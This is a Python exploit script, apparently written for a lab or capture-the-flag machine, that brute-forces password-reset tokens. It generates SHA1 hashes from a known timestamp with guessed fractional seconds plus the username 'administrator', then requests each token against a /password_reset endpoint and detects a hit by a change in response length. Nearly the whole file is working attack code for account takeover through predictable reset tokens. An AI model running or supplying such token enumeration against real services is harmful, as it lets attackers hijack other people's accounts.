# '2024-05-03 19:46:26.67'

import requests
import datetime
import hashlib
#testing 25 or 27 s 
username = 'administrator'
enumerateTokenPrifix = '2024-05-03 19:46:27.67'
toeknListPath = './tokenLists'


def readWordlistToList(filePath):
    
    list = []
    try:
        with open(filePath, "r") as wordlist:

            for line in wordlist:
                line = line.replace("\n", "")
                line = line.replace(" ", "")
                list.append(line) # Remove "/n"    

            #print("List:", list)
            wordlist.close()
        
        return list
    except FileNotFoundError:
        print("File not found:", filePath)
    except Exception as e:
        print("Error", e)


with open(toeknListPath, 'w') as file: #Clear File contents
    pass  


for guess in range(100):

    if guess < 10:
        enumerateToken = enumerateTokenPrifix + "0" + str(guess) + " . " + username.upper()
        guessToken = hashlib.sha1(enumerateToken.encode("utf-8")).hexdigest()
        with open("tokenLists",'a') as file:
            
            file.write(guessToken + '\n')
            file.close()
    else: 
        enumerateToken = enumerateTokenPrifix + str(guess) + " . " + username.upper()
        # print(enumerateToken)
        guessToken = hashlib.sha1(enumerateToken.encode("utf-8")).hexdigest()
        with open("tokenLists",'a') as file:
            file.write(guessToken + '\n')
            file.close()

# Normal Request (resetPassword)
url = 'http://10.10.46.163:8080/password_reset?token=' + 'ErrorToken'
originalReponse = requests.get(url)
OriginBodyLength = len(originalReponse.text)

tokens = readWordlistToList(toeknListPath)

# Guess Token

for token in tokens:
    url = 'http://10.10.46.163:8080/password_reset?token=' + token
    response = requests.get(url)
    print("Attempt",url)
    print(response.text)
    if len(response.text) != OriginBodyLength:
        print("Token Found!!!!")
        print("toekn",token)
        print(response.text)
        break 